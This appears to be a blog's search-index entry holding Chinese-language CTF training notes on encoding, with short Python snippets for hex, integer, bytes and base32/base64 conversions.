        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTF特训营-·-编码"><a href="#CTF特训营-·-编码" class="headerlink" title="CTF特训营 · 编码"></a>CTF特训营 · 编码</h1><h2 id="Py3-解决历史遗留问题"><a href="#Py3-解决历史遗留问题" class="headerlink" title="Py3 解决历史遗留问题"></a>Py3 解决历史遗留问题</h2><h3 id="1-字符串"><a href="#1-字符串" class="headerlink" title="1. 字符串"></a>1. 字符串</h3><ul><li>初级</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">hex_a = a.encode().<span class="built_in">hex</span>()  <span class="comment"># encode转字节型后再转十六进制</span></span><br></pre></td></tr></table></figure><ul><li>中等</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">a = binascii.hexlify(<span class="string">b&#x27;flag&#x27;</span>)  <span class="comment"># 字符串转字节转十六进制</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">num = <span class="number">584734024210391580014049650557280915516226103165</span></span><br><span class="line">a = <span class="built_in">hex</span>(num)[<span class="number">2</span>:]  <span class="comment"># 十六进制，去0x</span></span><br><span class="line">a = binascii.unhexlify(a)  <span class="comment"># 十六进制转字节型</span></span><br></pre></td></tr></table></figure><ul><li>高级</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">num = <span class="number">584734024210391580014049650557280915516226103165</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(num))</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(<span class="string">b&#x27;flag(123)&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="2-字符"><a href="#2-字符" class="headerlink" title="2. 字符"></a>2. 字符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)  <span class="comment"># ‘a’的十进制的ascii码 </span></span><br><span class="line">a = <span class="string">b&#x27;a&#x27;</span>.<span class="built_in">hex</span>() <span class="comment"># &#x27;a&#x27;的十六进制adcii码</span></span><br></pre></td></tr></table></figure><h3 id="3-整数"><a href="#3-整数" class="headerlink" title="3.整数"></a>3.整数</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">a</span> = hex(<span class="number">123</span>)</span><br><span class="line"><span class="attr">b</span> = bin(<span class="number">789</span>)</span><br><span class="line"><span class="attr">c</span> = oct(<span class="number">101</span>)</span><br><span class="line"><span class="attr">d</span> = int(<span class="string">&#x27;666c&#x27;</span>, <span class="number">16</span>) </span><br></pre></td></tr></table></figure><h2 id="Base-转码"><a href="#Base-转码" class="headerlink" title="Base 转码"></a>Base 转码</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(base64.b32encode(b<span class="string">&#x27;flag&#x27;</span>)</span></span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(base64.b64decode(<span class="string">&#x27;QVNU&#x27;</span>)</span></span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
